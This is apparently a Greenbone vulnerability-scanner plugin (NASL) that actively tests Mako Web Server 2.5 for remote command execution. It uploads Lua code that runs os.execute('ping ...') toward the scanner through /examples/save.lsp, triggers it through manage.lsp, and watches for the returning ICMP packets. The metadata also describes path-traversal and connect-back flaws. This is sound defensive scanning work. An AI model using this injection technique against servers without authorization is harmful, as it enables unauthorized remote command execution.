# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mako:mako_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811771");
  script_version("2024-11-13T05:05:39+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
  script_name("Mako Web Server 2.5 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  # nb: No "Web Servers" family as the affected components are some example scripts and not the web
  # server itself
  script_family("Web application abuses");
  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Mako/WebServer/installed");
  script_require_ports("Services/www", 9357, 80, 443);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/42683");
  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3391");

  script_tag(name:"summary", value:"Mako Web Server is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Mako web-server tutorial does not sufficiently sanitize the HTTP PUT requests when a user sends
  an HTTP PUT request to 'save.lsp' web page, the input passed to a function responsible for
  accessing the filesystem.

  - Mako web-server tutorial is not sufficiently sanitizing GET requests when a user sends GET
  request to the URI 'IP/fs/../..', the input is passed without modification and the response with
  the file content is returned.

  - Mako web-server tutorial is not sufficiently sanitizing incoming POST requests when a user sends
  an POST request to the 'rtl/appmgr/new-application.lsp' URI, the input will be executed and the
  server will connect to the attacker's machine.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary commands, gain access to potentially sensitive and conduct cross site request forgery
  attacks.");

  script_tag(name:"affected", value:"Mako Web Server version 2.5. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);
ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter);

if(os_host_runs("Windows") == "yes")
  target_runs_windows = TRUE;

foreach connect_back_target(make_list(ownip, ownhostname)) {

  if(target_runs_windows) {
    CMD = "os.execute('ping -n 5 " + connect_back_target + "')";
  } else {
    vtstrings = get_vt_strings();
    check = vtstrings["ping_string"];
    pattern = hexstr(check);
    CMD = "os.execute('ping -c 5 -p " + pattern + " " + connect_back_target + "')";
  }

  len = strlen(CMD);
  if(!len)
    continue;

  url = "/examples/save.lsp?ex=VTTest";
  req = string("PUT ", url, " HTTP/1.1\r\n",
               "Content-Length: ", len, "\r\n",
               "Host: ", host, "\r\n",
               "\r\n", CMD);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res || res !~ "^HTTP/1\.[01] 204" || res !~ "Server\s*:\s*MakoServer\.net")
    continue;

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames
  # / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason:
  # If the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if(!soc = open_sock_tcp(port))
    continue;

  url = "/examples/manage.lsp?execute=true&ex=VTTest&type=lua";

  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n");

  res = send_capture(socket:soc, data:req, timeout:5, pcap_filter:filter);

  close(soc);

  if(!res)
    continue;

  type = get_icmp_element(icmp:res, element:"icmp_type");
  if(!type || type != 8)
    continue;

  # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
  # should be always there. In addition at least standard Linux and Windows systems are always
  # sending data so it should be safe to check this here.
  if(!data = get_icmp_element(icmp:res, element:"data"))
    continue;

  if((target_runs_windows || check >< data)) {
    report = "It was possible to execute command remotely at " + http_report_vuln_url(port:port, url:url, url_only:TRUE) + " with the command '" + CMD + "'.";
    report += '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump(ddata:data);
    security_message(port:port, data:report);
    exit(0);
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit(0);
